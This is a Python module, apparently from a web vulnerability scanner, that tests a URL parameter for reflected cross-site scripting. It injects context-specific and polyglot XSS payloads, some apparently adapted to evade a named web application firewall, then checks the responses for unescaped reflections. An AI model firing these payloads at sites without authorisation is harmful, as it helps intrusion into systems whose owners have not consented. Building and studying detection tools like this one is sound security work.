from typing import Optional
import requests

from tools.log_utils import get_logger
from tools.http_client import build_url
from tools.payload_engine import generate
from tools.html_context_parser import probe_and_detect
from tools.settings import settings

logger = get_logger("xss_detector")

REFLECTION_MARKERS = ["XSS_TEST_%d" % i for i in range(100, 160)]

POLYGLOT_PAYLOADS = [
    '"><svg onload=alert(1)>',
    "'-alert(1)-'",
    '\\";alert(1);//',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
]

try:
    from tools.xss_browser_verify import check as browser_verify
    HAS_BROWSER_VERIFY = True
except Exception:
    browser_verify = None
    HAS_BROWSER_VERIFY = False


def _payload_reflected_unescaped(html: str, payload: str) -> bool:
    if not payload:
        return False
    if payload not in html:
        return False
    escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
    return escaped not in html


def _has_unescaped_trigger(html: str) -> bool:
    triggers = ["alert(1)", "alert(1)", "onerror=", "onload=", "onfocus=", "ontoggle=", "onmouseover="]
    for t in triggers:
        if t in html:
            escaped = t.replace("=", "&#x3D;")
            if escaped not in html:
                return True
    return False


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, post_body: bool = False, post_data: dict = None,
          context: str = "all", waf_name: Optional[str] = None) -> dict:
    if sess is None:
        sess = requests.Session()
        sess.verify = settings.verify_ssl
    result = {"vulnerable": False, "type": None, "evidence": [], "confirmed": False,
              "vector": None, "needs_browser_verify": False, "confidence": "low"}

    if context == "all":
        detected = probe_and_detect(url, param, sess, timeout, post_body, post_data)
        if detected not in ("not_reflected", "unknown"):
            logger.debug("context probe: %s -> %s", param, detected)
            context = detected

    contexts = ["html", "attr", "js", "angular"] if context == "all" else [context]

    for ctx in contexts:
        seeds = generate("xss", ctx, "all", waf_name)
        for i, entry in enumerate(seeds):
            payload = entry["payload"]
            marker = REFLECTION_MARKERS[i % len(REFLECTION_MARKERS)]
            test_payload = marker + payload
            try:
                if post_body and post_data:
                    d = post_data.copy()
                    d[param] = test_payload
                    r = sess.post(url, data=d, timeout=timeout)
                else:
                    r = sess.get(build_url(url, param, test_payload), timeout=timeout)

                if marker in r.text and _payload_reflected_unescaped(r.text, payload):
                    result["vulnerable"] = True
                    result["type"] = "reflected_%s" % ctx
                    result["vector"] = payload[:80]
                    result["confidence"] = "medium"
                    result["evidence"].append("reflected %s in %s (%dB)" % (ctx, param, len(r.text)))

                    if _has_unescaped_trigger(r.text):
                        result["confirmed"] = True
                        result["confidence"] = "high"
                        result["evidence"].append("unescaped trigger detected")
                    elif HAS_BROWSER_VERIFY:
                        verify_result = browser_verify(url, param, sess, timeout)
                        if verify_result.get("confirmed"):
                            result["confirmed"] = True
                            result["confidence"] = "high"
                            result["evidence"].extend(verify_result.get("evidence", []))
                    return result
            except Exception as e:
                logger.debug("xss %s payload: %s", ctx, e)

    if not result["vulnerable"]:
        for payload in POLYGLOT_PAYLOADS:
            try:
                r = sess.get(build_url(url, param, payload), timeout=timeout)
                if _payload_reflected_unescaped(r.text, payload):
                    result["vulnerable"] = True
                    result["type"] = "polyglot"
                    result["confidence"] = "medium"
                    result["evidence"].append("polyglot reflected: %s" % payload[:30])
                    result["vector"] = payload[:80]
                    if _has_unescaped_trigger(r.text):
                        result["confirmed"] = True
                        result["confidence"] = "high"
                    break
            except Exception as e:
                logger.debug("xss polyglot: %s", e)

    return result
